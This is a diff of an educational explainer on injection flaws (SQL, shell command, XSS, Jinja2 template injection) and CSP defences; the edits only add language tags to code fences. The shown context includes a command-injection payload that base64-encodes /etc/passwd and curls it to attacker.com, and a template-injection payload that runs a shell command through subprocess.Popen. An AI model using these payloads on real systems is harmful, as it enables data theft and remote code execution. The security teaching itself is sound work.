@@ -35,7 +35,7 @@ if (mysqli_num_rows($result) > 0) { /* grant access */ }
 
 Under normal operation, the MySQL lexer tokenizes this as:
 
-```
+```sql
 SELECT  id  ,  role  FROM  users  WHERE  username  =  'alice'
 AND  password  =  '5f4dcc3b5aa765d61d8327deb882cf99'
 ```
@@ -49,7 +49,7 @@ AND password = '...'
 
 The lexer now produces a structurally different token stream. The single quote terminates the string literal early, `OR` becomes a boolean operator, `'1'='1'` is a tautology that always evaluates to true, and `--` is MySQL's single-line comment introducer, which causes the lexer to discard the rest of the input including the password predicate. The parse tree now looks like this:
 
-```
+```text
                 WHERE
                /     \
              OR        [discarded]
@@ -113,7 +113,7 @@ The `shell=True` argument causes Python to pass the composed string to `/bin/sh 
 
 More targeted payloads exploit subshell expansion:
 
-```
+```text
 host = 8.8.8.8 $(cat /etc/passwd | base64 | curl -d @- https://attacker.com/exfil)
 ```
 
@@ -147,7 +147,7 @@ XSS mechanics are significantly more complex than SQL or command injection becau
 
 The five parsing contexts and their relevant control tokens are best understood through the browser's HTML5 parsing state machine:
 
-```
+```text
 HTML Text Context:        < starts a tag, & starts an entity
 HTML Attribute Context:   " or ' closes the attribute value, < starts a tag
 JavaScript String Context: \ is escape, ' or " closes the string
@@ -205,7 +205,7 @@ def greet():
 
 The developer's intent is to substitute `name` as a plain text value. But because `f"<h1>Hello, {name}!</h1>"` runs Python's f-string interpolation before `render_template_string` ever sees it, the resulting string is passed to Jinja2's parser. If `name` is `{{ config }}`, Jinja2 evaluates it as a template expression and renders the Flask application's configuration object — which typically contains the secret key, database URIs, and other secrets. If `name` is `{{ ''.__class__.__mro__[1].__subclasses__() }}`, Jinja2 evaluates the expression, traversing Python's object hierarchy through `str.__mro__` to `object`, then listing all classes that inherit from `object` in the current Python process. Among those subclasses is `subprocess.Popen`. The attacker can invoke it:
 
-```
+```text
 {{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
 ```
 
@@ -313,7 +313,7 @@ END
 
 Content Security Policy (CSP) is not a primary XSS defense but an effective depth layer that restricts what an injected script can do after it executes. CSP is delivered as an HTTP response header and instructs the browser to enforce a whitelist of trusted sources for scripts, styles, images, frames, and other resource types. A well-configured CSP with `script-src 'nonce-{random}'` requires every inline script tag to carry a cryptographically random nonce generated per-response. An injected `<script>alert(1)</script>` tag without the matching nonce attribute is blocked by the browser before execution.
 
-```
+```text
 Content-Security-Policy: default-src 'none';
                           script-src 'nonce-rAnd0mBase64ValueGeneratedPerRequest';
                           connect-src 'self';
